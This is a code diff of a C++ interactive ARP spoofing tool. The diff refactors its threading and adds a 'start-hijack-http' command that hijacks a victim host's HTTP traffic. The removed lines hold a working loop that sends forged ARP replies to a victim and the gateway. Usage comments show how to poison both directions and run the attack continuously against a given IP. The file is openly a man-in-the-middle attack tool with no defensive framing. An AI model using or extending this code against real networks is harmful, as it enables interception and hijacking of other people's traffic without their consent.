@@ -1,15 +1,7 @@
-/*
- * Arguments:
- * victim's ip
- * how many packets
- * time interval
- * device name
- */
-
-
 #include "arpspf.h"
 #include "hdrs.h"
 #include "netinfo.h"
+#include "pthargs.h"
 
 #include <set>
 
@@ -18,41 +10,31 @@
 
 using namespace kni;
 
-void *thread_spoof(void *);
+void *routine_start_spoof(void *ptr);
+
+void *routine_start_hijack_http(void *ptr);
 
 typedef void (*arpspf_func)(int, char *[]);
 
 void arpspf_exit(int, char **);
-
-void arpspf_spoof_start(int, char **);
-
-void arpspf_spoof_stop(int, char **);
-
 void arpspf_scan_lan(int, char **);
 
-void arpspf_forward(int, char **);
+void arpspf_start_spoof(int, char **);
 
-void arpspf_hijack(int, char **);
+void arpspf_stop_spoof(int, char **);
 
+void arpspf_start_hijack_http(int, char **);
+
+void arpspf_stop_hijack_http(int, char **);
 void arpspf_device(int, char **);
 
-
-netinfo *netdb;
 int keep_looping = 1;
 
+std::unique_ptr<netinfo> netdb;
+std::unique_ptr<char[]> errbuf(new char[PCAP_ERRBUF_SIZE]);
 
-struct {
-    int npackets{};
-    int seconds{};
-    bool twoway{};
-    std::string victim_ip{};
-    mac_t victim_mac{};
-
-    bool to_be_running{false};
-    pthread_t thread_id{};
-} thread_spoof_args;
-
-
+std::unique_ptr<pthargs_spoof> args_spf(new pthargs_spoof());
+std::unique_ptr<pthargs_hijack_http> args_hij(new pthargs_hijack_http());
 
 
 int main(int argc, char *argv[]) {
@@ -61,9 +43,9 @@ int main(int argc, char *argv[]) {
     else if (strcmp(argv[1], "lo") == 0)
         KNI_FATAL_ERROR("using lo doesn't make sense");
 
-    std::unique_ptr<char[]> errbuf(new char[PCAP_ERRBUF_SIZE]);
+    std::unique_ptr<netinfo> temp(new netinfo(errbuf.get(), PCAP_ERRBUF_SIZE));
+    netdb = std::move(temp);
 
-    netdb = new netinfo(errbuf.get(), PCAP_ERRBUF_SIZE);
     if (!netdb->set_dev(argv[1]) || !netdb->update_gateway_ip())
         KNI_FATAL_ERROR(netdb->error());
 
@@ -73,16 +55,16 @@ int main(int argc, char *argv[]) {
     arpspf_cmd["exit"] = arpspf_exit;
     arpspf_cmd["scan"] = arpspf_scan_lan;
     arpspf_cmd["dev"] = arpspf_device;
-    arpspf_cmd["start"] = arpspf_spoof_start;
-    arpspf_cmd["stop"] = arpspf_spoof_stop;
-    arpspf_cmd["fwd"] = arpspf_forward;
-    arpspf_cmd["hij"] = arpspf_hijack;
+    arpspf_cmd["start-spoof"] = arpspf_start_spoof;
+    arpspf_cmd["stop-spoof"] = arpspf_stop_spoof;
+    arpspf_cmd["start-hijack-http"] = arpspf_start_hijack_http;
+    arpspf_cmd["stop-hijack-http"] = arpspf_stop_hijack_http;
 
     arpspf_device(0, nullptr);
     arpspf_scan_lan(0, nullptr);
 
     while (keep_looping) {
-        KNI_OUTPUT("> ");
+        KNI_PRINT("> ");
 
         int bytes;
         char *line_buf = nullptr, dmt;
@@ -126,7 +108,6 @@ int main(int argc, char *argv[]) {
         free(line_buf);
     }
 
-    delete netdb;
     return 0;
 }
 
@@ -145,79 +126,30 @@ void arpspf_exit(int argc, char **argv) {
     keep_looping = false;
 }
 
-
-void *thread_spoof(void *) {
-    auto args = &thread_spoof_args;
-
-    char errbuf[PCAP_ERRBUF_SIZE] = {0};
-    arp_io_packet arp_io(errbuf);
-
-    u_char sndbuf[ETHER_HDRLEN + ARP_HDRLEN] = {0};
-    arp_io.update_input(sndbuf);
-
-    if (!arp_io.open(netdb->devname)) {
-        KNI_LOG_ERROR("failed to open device \"%s\" :%s", netdb->devname.c_str(), arp_io.error());
-        return nullptr;
-    } else {
-        KNI_LOG_DEBUG("device \"%s\" opened successfully.", netdb->devname.c_str());;
-    }
-
-    KNI_LOG_DEBUG("ip=%s secs=%d pkts=%d twoway=%d", args->victim_ip.c_str(), args->seconds, args->npackets,
-                  args->twoway);
-    KNI_OUTPUT_LF("Spoofing %s(%s)...", to_string(args->victim_mac).c_str(), args->victim_ip.c_str());
-
-    int count = 0;
-    while (args->to_be_running) {
-        bool succ = arp_io.reply(netdb->gateway_ip, netdb->devinfo.hw_addr, args->victim_ip, args->victim_mac);
-        if (succ && args->twoway)
-            succ = arp_io.reply(args->victim_ip, netdb->devinfo.hw_addr, netdb->gateway_ip, netdb->gateway_mac);
-
-        if (!succ)
-            KNI_LOG_ERROR("%s", arp_io.error());
-
-        // If args->npackets < 0 then it becomes an infinite loop
-        if (++count == args->npackets)
-            break;
-        else
-            sleep(static_cast<unsigned int>(args->seconds));
-    }
-
-    KNI_LOG_DEBUG("restoring ARP...");
-
-    for (int i = 0; i < 5; ++i) {
-        bool succ = arp_io.reply(netdb->gateway_ip, netdb->gateway_mac, args->victim_ip, args->victim_mac);
-        if (succ && args->twoway)
-            succ = arp_io.reply(args->victim_ip, args->victim_mac, netdb->gateway_ip, netdb->gateway_mac);
-
-        if (!succ)
-            KNI_LOG_ERROR("%s", arp_io.error());
-
-        if (i != args->npackets - 1)
-            sleep(static_cast<unsigned int>(3));
-    }
-
-    arp_io.close();
-    KNI_LOG_DEBUG("device \"%s\" closed", netdb->devname.c_str());
-
-    return nullptr;
-}
-
-/*
- * start - perform LAN arp spoofing on a given host
+/**
+ * start-spoof - perform LAN arp spoofing on a given host
  *
- * start 192.168.225.187 -n 5 -c 100
- *      Target on 192.168.225.187 and send 100 packets at 5-second intervals
- * start 192.168.225.187 11:22:33:44:55:66 -t
- *      Use user-provided MAC address if the host is not detected by "scan".
- *      Send fake packets to both victim and gateway
- * start 192.168.225.187 -d
- *      Perform attack in another thread and loop until "stop"
+ * Target on 192.168.225.187 and send 100 packets at 5-second intervals
  *
+ *      start-spoof 192.168.225.187 -n 5 -c 100
+ *
+ * Use user-provided MAC address if the host is not detected by "scan"
+ * and send fake packets to both victim and gateway
+ *
+ *      start-spoof 192.168.225.187 11:22:33:44:55:66 -t
+ *
+ * Perform attack in another thread and loop until "stop"
+ *
+ *      start-spoof 192.168.225.187 -d
+ *
+ *
+ * @param argc
+ * @param argv
  */
-void arpspf_spoof_start(int argc, char **argv) {
+void arpspf_start_spoof(int argc, char **argv) {
     KNI_LOG_DEBUG("%s(argc=%d):", __FUNCTION__, argc);
-    if (thread_spoof_args.to_be_running) {
-        KNI_OUTPUT_LF("Thread is already running");
+    if (args_spf->to_be_running) {
+        KNI_PRINTLN("Thread is already running");
         return;
     }
 
@@ -250,18 +182,18 @@ void arpspf_spoof_start(int argc, char **argv) {
     argv += optind;
 
     if (seconds <= 0) {
-        KNI_OUTPUT_LF("Invalid arguments.");
+        KNI_PRINTLN("Invalid arguments.");
         return;
     }
 
     if (argc == 0) {
-        KNI_OUTPUT_LF("Missing an IP address.");
+        KNI_PRINTLN("Missing an IP address.");
         return;
     }
 
     char ipbuf[16];
     if (inet_pton(AF_INET, argv[0], ipbuf) == 0) {
-        KNI_OUTPUT_LF("\"%s\" doesn't contain a valid IPv4 address", argv[0]);
+        KNI_PRINTLN("\"%s\" doesn't contain a valid IPv4 address", argv[0]);
         return;
     }
 
@@ -269,41 +201,39 @@ void arpspf_spoof_start(int argc, char **argv) {
     mac_t victim_mac;
 
     if (netdb->cached(victim_ip) == 0) {
-        KNI_OUTPUT_LF("Host %s not detected.", argv[0]);
+        KNI_PRINTLN("Host %s not detected.", argv[0]);
 
         if (argc == 1) {
-            KNI_OUTPUT_LF("Missing an MAC address. Run \"scan\" to discover LAN hosts.");
+            // TODO Resolve an IP into MAC
+            KNI_PRINTLN("Missing an MAC address. Run \"scan\" to discover LAN hosts.");
             return;
 
         } else if (mac_pton(argv[1], &victim_mac) == 0) {
-            KNI_OUTPUT_LF("\"%s\" is not a valid MAC address\n", argv[1]);
+            KNI_PRINTLN("\"%s\" is not a valid MAC address\n", argv[1]);
             return;
 
         }
-        KNI_OUTPUT_LF("Using user-supplied MAC \"%s\"\n", argv[1]);
+        KNI_PRINTLN("Using user-supplied MAC \"%s\"\n", argv[1]);
 
     } else if (victim_ip == netdb->gateway_ip) {
-        KNI_OUTPUT_LF("An ip address except the gateway's is required.\n");
+        KNI_PRINTLN("An ip address except the gateway's is required.\n");
         return;
 
     } else {
         victim_mac = netdb->map(victim_ip);
     }
 
-    thread_spoof_args.victim_ip = victim_ip;
-    thread_spoof_args.twoway = twoway;
-    thread_spoof_args.victim_mac = victim_mac;
-    thread_spoof_args.npackets = npackets;
-    thread_spoof_args.seconds = seconds;
-    thread_spoof_args.to_be_running = true;
+    auto args = args_spf.get();
+    args->victim_ip = victim_ip;
+    args->twoway = twoway;
+    args->victim_mac = victim_mac;
+    args->npackets = npackets;
+    args->seconds = seconds;
+    args->to_be_running = true;
 
-
-    int ret = pthread_create(
-            &thread_spoof_args.thread_id,
-            nullptr,
-            thread_spoof,
-            nullptr
-    );
+    int ret = pthread_create(&args->thread_id,
+                             nullptr,
+                             routine_start_spoof, args);
 
     if (ret != 0) {
         KNI_LOG_ERROR("pthread_create() returns %d:%s", ret, strerror(ret));
@@ -311,8 +241,8 @@ void arpspf_spoof_start(int argc, char **argv) {
     }
 
     if (wait_thread) {
-        pthread_join(thread_spoof_args.thread_id, nullptr);
-        thread_spoof_args.to_be_running = false;
+        pthread_join(args->thread_id, nullptr);
+        args->to_be_running = false;
     } else {
         sleep(2); // attempt to avoid the competition of another thread's output and the "prompt string one"
     }
@@ -326,11 +256,11 @@ void arpspf_scan_lan(int, char **) {
         return;
     }
 
-    KNI_OUTPUT_LF("Scanning hosts...");
+    KNI_PRINTLN("Scanning hosts...");
 
     if (netdb->update_arp()) {
         for (auto &p: netdb->mapping()) {
-            KNI_OUTPUT_LF("ip: %s\t- mac: %s", p.first.c_str(), to_string(p.second).c_str());
+            KNI_PRINTLN("ip: %s\t- mac: %s", p.first.c_str(), to_string(p.second).c_str());
         }
     } else {
         KNI_LOG_ERROR("%s", netdb->error());
@@ -338,44 +268,105 @@ void arpspf_scan_lan(int, char **) {
 
 }
 
-void arpspf_forward(int, char **) {
+
+/**
+ * start-hijack-http 192.168.225.187 -p 8080
+ *
+ * @param argc
+ * @param argv
+ */
+void arpspf_start_hijack_http(int argc, char **argv) {
     KNI_LOG_DEBUG("%s()", __FUNCTION__);
+    if (args_hij->to_be_running) {
+        KNI_PRINTLN("Thread is already running");
+        return;
+    }
+
+    optind = 1; // https://stackoverflow.com/a/15179990/8706476
+
+    int opt, port = 8080;
+    while ((opt = getopt(argc, argv, "p:")) != -1) {
+        switch (opt) {
+            case 'p':
+                port = atoi(optarg);
+                break;
+            default:
+                break;
+        }
+    }
+
+    argc -= optind;
+    argv += optind;
+
+    if (argc == 0) {
+        KNI_PRINTLN("Missing an IP address.");
+        return;
+    }
+
+    char ipbuf[16];
+    if (inet_pton(AF_INET, argv[0], ipbuf) == 0) {
+        KNI_PRINTLN("\"%s\" doesn't contain a valid IPv4 address", argv[0]);
+        return;
+    }
+
+    if (!netdb->cached(argv[0])) {
+        KNI_PRINTLN("Host %s not detected", argv[0]);
+    }
+
+    auto args = args_hij.get();
+
+    args->victim_ip = argv[0];
+    args->netdb = netdb.get();
+    args->dest_port = static_cast<uint16_t>(port);
+    args->to_be_running = true;
+
+    auto ret = pthread_create(&args->thread_id,
+                              nullptr,
+                              routine_start_hijack_http, args);
+
+    if (ret == -1) {
+        KNI_LOG_ERROR("pthread_create() returns %d:%s", ret, strerror(ret));
+        return;
+    }
+
+    sleep(2);
 }
 
-void arpspf_hijack(int, char **) {
+void arpspf_stop_hijack_http(int, char **) {
     KNI_LOG_DEBUG("%s()", __FUNCTION__);
 }
 
 void arpspf_device(int, char **) {
     KNI_LOG_DEBUG("%s()", __FUNCTION__);
 
-    KNI_OUTPUT_LF("Gateway: %s", netdb->gateway_ip.c_str());
+    KNI_PRINTLN("Gateway: %s", netdb->gateway_ip.c_str());
 
-    KNI_OUTPUT_LF("Device \"%s\":", netdb->devname.c_str());
+    KNI_PRINTLN("Device \"%s\":", netdb->devname.c_str());
 
     auto netenv = &(netdb->devinfo);
-    KNI_OUTPUT_LF("\tHWaddr:%s Bcast:%s",
-                  to_string(netenv->hw_addr).c_str(),
-                  to_string(netenv->hw_bcast).c_str());
-    KNI_OUTPUT_LF("\tinet addr:%s Bcast:%s Mask:%s",
-                  to_string(netenv->ip).c_str(),
-                  to_string(netenv->ip_bcast).c_str(),
-                  to_string(netenv->ip_netmask).c_str());
+    KNI_PRINTLN("\tHWaddr:%s Bcast:%s",
+                to_string(netenv->hw_addr).c_str(),
+                to_string(netenv->hw_bcast).c_str());
+    KNI_PRINTLN("\tinet addr:%s Bcast:%s Mask:%s",
+                to_string(netenv->ip).c_str(),
+                to_string(netenv->ip_bcast).c_str(),
+                to_string(netenv->ip_netmask).c_str());
 }
 
 /**
  * Stop an existing attack in another thread
  */
-void arpspf_spoof_stop(int, char **) {
+void arpspf_stop_spoof(int, char **) {
     KNI_LOG_DEBUG("%s()", __FUNCTION__);
 
-    if (!thread_spoof_args.to_be_running)
-        KNI_OUTPUT_LF("Thread is not running");
+    if (!args_spf->to_be_running)
+        KNI_PRINTLN("Thread is not running");
     else {
-        thread_spoof_args.to_be_running = false;
-        pthread_join(thread_spoof_args.thread_id, nullptr);
-        KNI_OUTPUT_LF("Thread exits.");
+        args_spf->to_be_running = false;
+        pthread_join(args_spf->thread_id, nullptr);
+        KNI_PRINTLN("Thread exits.");
     }
-
 }
+
+
 
